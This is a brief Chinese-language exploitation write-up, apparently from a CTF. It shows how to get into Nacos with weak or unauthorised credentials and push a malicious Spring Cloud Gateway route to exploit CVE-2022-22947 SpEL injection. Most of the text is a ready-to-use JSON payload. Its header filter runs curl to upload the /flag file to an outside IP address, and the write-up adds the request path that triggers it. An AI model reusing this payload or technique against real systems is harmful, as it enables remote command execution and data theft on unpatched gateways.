Spring Cloud Gateway曾出现CVE-2022-22947漏洞，该漏洞允许攻击者通过动态配置路由，执行SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。但实际情况可能有很多Spring Cloud Gateway存在漏洞，但未开放Actuator API，所以导致无法利用。但如果在资产收集时发现目标存在nacos，并且可用弱口令或者未授权漏洞创建用户登录进去的话，我们可以采用Nacos的动态配置特性结合Spring Cloud Gateway的RCE漏洞进行利用。


利用nacos漏洞进入后台后，发现gateway配置文档，修改发布，进行spel注入命令执行。下面是json格式。
这里是给jar，反编译查看到了基础的配置
```
{
    "spring": {
        "cloud": {
            "gateway": {
                "routes": [
                    {
                        "id": "whocansee",
                        "order": 0,
                        "uri": "lb://backendservice",
                        "predicates": [
                            "Path=/echo/**"
                        ],
                        "filters": [
                            {
                                "name": "AddResponseHeader",
                                "args": {
                                    "name": "result",
                                    "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'curl','http://47.113.202.32:23233','-T','/flag'}).getInputStream())).replaceAll('\n','').replaceAll('\r','')}"
                                }
                            }
                        ]
                    }
                ]
            }
        }
    }
}
```
此时访问/echo/11触发
